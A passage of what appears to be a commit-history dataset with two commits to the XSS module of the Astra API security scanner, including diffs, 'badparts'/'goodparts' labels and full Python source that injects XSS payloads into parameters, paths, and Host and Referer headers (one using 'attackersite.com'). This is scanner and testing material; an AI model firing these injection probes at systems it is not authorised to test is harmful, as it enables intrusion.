            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 6b3c332..0ca843a 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -62,7 +62,7 @@ def xss_post_method(url,method,headers,body,scanid=None):\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
                            "diff": "\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "                impact = check_xss_impact(xss_post.body)"
                            ],
                            "goodparts": [
                                "                impact = check_xss_impact(xss_post_request.headers)"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "Minor changes in xss_post_method function"
        },
        "9d52656d839d6a97eeca12578ca127318a367e00": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/9d52656d839d6a97eeca12578ca127318a367e00",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/9d52656d839d6a97eeca12578ca127318a367e00",
            "sha": "9d52656d839d6a97eeca12578ca127318a367e00",
            "keyword": "XSS change",
            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 0ca843a..eafd147 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -101,7 +101,7 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
                            "diff": "\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        referer_header_value = 'http://attackersite.com?test='+payload"
                            ],
                            "goodparts": [
                                "        referer_header_value = 'https://github.com?test='+payload"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = 